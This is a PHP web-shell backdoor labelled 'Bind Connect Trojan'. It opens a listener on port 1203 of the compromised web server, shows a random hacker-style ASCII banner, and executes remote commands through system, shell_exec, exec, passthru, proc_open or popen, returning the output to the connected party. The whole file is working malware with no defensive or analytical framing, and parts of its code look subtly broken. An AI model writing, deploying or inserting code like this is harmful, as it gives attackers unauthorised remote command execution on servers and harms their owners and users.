<?php
/*
Bind Connect Trojan
-------------------
*/
@set_time_limit(0);
if(php_sapi_name() === "cli"){
	exit(-1);
}
if(function_exists("posix_getpwuid")){
	$xuser_uid = posix_getpwuid(posix_geteuid());
	$xuser = $xuser_uid['name'];
	$xgroup_uid = posix_getpwuid(posix_getegid());
	$xgroup = $xgroup_uid['name'];
}
else {
	$xuser = @get_current_user();
	$xgroup = "???";
}
$host = @gethostbyname($_SERVER['HTTP_HOST']);
$port = "1203";
$method = "stream_socket_server";
if(!function_exists("stream_socket_server")){
	$method = "socket_create";
}
setup_bind($host, $port, $method);

function kool_benner(){
	$haxor = <<<LULZ
 _    _
| |  | |       
| |__| | __ _ __  _____  _ __
|  __  |/ _` |\ \/ / _ \| '__|
| |  | | (_| | >  < (_) | |
|_|  |_|\__'_|/_/\_\___/|_|

Funny eh?

LULZ;

	$hacked = <<<LULZ
 _    _                            _
| |  | |           _              | |
| |__| | __ _  ___| | __  ___   __| |
|  __  |/ _` |/ __| |/ / / _ \ / _  |
| |  | | (_| | (__|   < |  __/| (_| |
|_|  |_|\__'_|\___|_|\_\ \___| \__'_|
 _
| |
| |__  _   _
|  _ \| | | |
| |_) | |_| |
|_'__/ \__, |
        __/ |
       |___/
 __  __
|  \/  |
| \  / | ___     _   _      _
| |\/| |/ _ \   (_) \ \    / /
| |  | |  __/    _   \ \  / /
|_|  |_|\___|   (_)   \ \/ /
                       \__/

LULZ;

	$mr_loots = <<<LULZ
     __________    
    |  __||__  |
    | (__||__  |
    |  __||__) |
 ___|    ||    |___
|__________________|
    " (0)-(0)  "
     "   ^    "
      " ~0~  "
       """"""
        |  |
   ____/ \/ \_____
  /               \

LULZ;

	$biasa = <<<LULZ
                          _
 _     _                 | |  _
| | __(_)_ __  __ _ _ __ | |_(_)
| |/ /| | '__|/ _` | '_ \| __| |
|   < | | |  < (_| | | | | |_| |
|_|\_\|_|_|   \__,_|_| |_|\__|_|

LULZ;

	$nsfg = <<<LULZ
                                   __________________ 
                                  / ________________ \
                                 / /                \ \
                                / /                  \ \
 ______________________________/ /____________________\ \__________________________________________________
|  _______            |////////////////////////////////////////////////////////////////////////////////////|-----|
| '       / __________|/////////////Contain Sensitive Contents///////////////////////______________________|-----|
| '      / /          |////////////////////////Not Safe For Government///////////////     __________/
| '     / /           |____________________________________________________________/     /
| '    / /            /                       -------------___________                  /
| '___/ /            /           ` ____________________________________________________/ 
|______/            / """x"""""  /   ;;  """   ,,         "      "      
                   / """""x"""  /    ;;  ''   ,,          "      "	  
                  / ""x""""""  /      ;;  '' ,,            "      "      
                 / "x"""""""  /         `````               "      "     
                / """""x"""  /                               "      "    
               / """x"""""  /                                 "      "   
              /____________/                                   "      "
                                                                "      "
                                                                 """""""

LULZ;

	$galau = <<<LULZ
================================================================================================
==                                    Empire of Galau                                         ==
== Are you looking for:                                                                       ==
== [ ] Girls                                                                                  ==
== [ ] Love                                                                                   ==
== [x] Nothing (but i will got a love in the future)                                          ==
================================================================================================

LULZ;
	
	$clay = <<<LULZ
                   __
                  |''|
                  |  |
                __|  |
               |  |  |__
             __|  |()|  |_
            |  |  |  |  |`\
            |  |  |  |  |  |
            |              /
             \            /
              |	         |
              |          |
               \________/

             CLAY WAS HERE
           NO SYSTEM IS SAFE

LULZ;

	$fsoc = <<<LULZ
\t\t----------------------------------------

\t\t\tLEAVE ME HERE

\t\t----------------------------------------

LULZ;

	$author = <<<LULZ
        ____  __       _    _                 _   _____                
       / /  \/  |     | |  | |               | | |_   _|               
      / /| \  / |_   _| |__| | ___  __ _ _ __| |_  | |  ___ _   _ _ __ 
     / / | |\/| | | | |  __  |/ _ \/ _` | '__| __| | | / __| | | | '__|
  _ / /  | |  | | |_| | |  | |  __/ (_| | |  | |_ _| |_\__ \ |_| | |   
 (_)_/   |_|  |_|\__, |_|  |_|\___|\__,_|_|   \__|_____|___/\__, |_|   
                  __/ |                                      __/ |     
                 |___/                                      |___/      

LULZ;
	$ascii_art = array(
		$haxor,
		$mr_loots,
		$nsfg,
		$galau,
		$author,
		$hacked,
		$clay,
		$fsoc,
		$biasa
	);
	
	return $ascii_art[rand(0, 8)];
}

function shexec($x, $win_tick = false){
	if(DIRECTORY_SEPARATOR === "/"){
		$x .= " 2>&1";
	}
	
	if(function_exists("system")){
		ob_start();
		@system($x);
		$out = ob_get_contents();
		ob_end_clean();
		return $out;
	}
	elseif(function_exists("shell_exec")){
		return @shell_exec($x);
	}
	elseif(function_exists("exec")){
		@exec($x, $outArr, $ret);
		return implode(PHP_EOL, $outArr);
	}
	elseif(function_exists("passthru")){
		ob_start();
		@passthru($x, $ret);
		$out = ob_get_contents();
		ob_end_clean();
		return $out;
	}
	elseif(function_exists("proc_open")){
		$deskrip = array(
			0 => array(
				"pipe",
				"r"
			),
			1 => array(
				"pipe",
				"w"
			),
			2 => array(
				"pipe",
				"w"
			)
		);
		if(DIRECTORY_SEPARATOR === "\\"){
			$old_tick = $x;
			if($win_tick){
				$old_tick = "C:\\Windows\\System32\\cmd.exe /C {$x}";
			}
			
			$process = @proc_open($old_tick, $deskrip, $pipes, @getcwd(), null, array(
				"suppress_errors" => false,
				"bypass_shell" => true
			));
			if(!is_resource($process)){
				$old_tick = $x;
				$process = @proc_open($old_tick, $deskrip, $pipes, @getcwd(), null, array(
					"suppress_errors" => false,
					"bypass_shell" => true
				));
			}
		}
		else {
			$process = @proc_open($old_tick, $deskrip, $pipes, @getcwd());
		}
		
		$out = "";
		if(is_resource($process)){
			fclose($pipes[0]);
			$out = stream_get_contents($pipes[1]);
			fclose($pipes[1]);
			$err = stream_get_contents($pipes[2]);
			$out .= $err;
			fclose($pipes[2]);
			$ret = proc_close($process);
		}
		return $out;
	}
	elseif(function_exists("popen")){
		$process = popen($x, "r");
		$out = fread($process, 4096);
		pclose($process);
		return $out;
	}
	return "Every functions is inactive or disabled, sorry dudes :(";
}

function setup_bind($host, $port, $type = "stream_socket_server"){
	global $xuser;
	if($type == "stream_socket_server"){
		$fpsock = @stream_socket_server("tcp://$host:$port", $errno, $errstr);
		$cs = @stream_socket_accept($fpsock);
		if(!$fpsock){
			return "Failed, $errno: $errstr";
		}
		else {
			fputs($cs, kool_benner());
			while(!feof($cs)){
				fwrite($cs, $xuser."@".@gethostbyname($_SERVER['HTTP_HOST']).":".@getcwd()." ~$");
				$cmds = fgets($cs, 1024);
				if(preg_match("/cd\ ([^\s]+)/i", $cmds, $rr)){
					$dd = $rr[1];
					if(is_dir($dd))chdir($dd);
				}
				elseif(trim($cmds) == "quit" || trim($cmds) == "exit"){
					fwrite($cs, "Session Ends");
					fclose($cs);
					exit;
				}
				fwrite($cs, shexec($cmds));
			}
			fclose($cs);
			fclose($fpsock);
		}
	}
	elseif($type == "socket_create"){
		$fpsock = @socket_create(AF_INET, SOCK_STREAM, 0);
		socket_set_nonblock($fpsock);
		if(!$fpsock){
			return "Whoops, Rejected";
		}
		else {
			@socket_write($fpsock, kool_benner(), strlen(kool_benner()));
			while(!@socket_connect($fpsock, $host, $port)){
				@socket_write($fpsock, $xuser."@".@gethostbyname($_SERVER['HTTP_HOST']).":".@getcwd()."~$", 
				strlen($xuser."@".@gethostbyname($_SERVER['HTTP_HOST']).":".@getcwd()."~$"));
				$cmds = @socket_read($fpsock, 1024, PHP_NORMAL_READ);
				if(preg_match("/cd\ ([^\s]+)/i", $cmds, $rr)){
					$dd = $rr[1];
					if(is_dir($dd))chdir($dd);
				}
				elseif(trim($cmds) == "quit" || trim($cmds) == "exit"){
					socket_write($fpsock, "Session Ends", strlen("Session Ends"));
					socket_set_block($fpsock);
					socket_close($fpsock);
				}
				socket_write($fpsock, shexec($cmds), strlen(shexec($cmds)));
			}
			socket_set_block($fpsock);
			socket_close($fpsock);
		}
	}
}
?>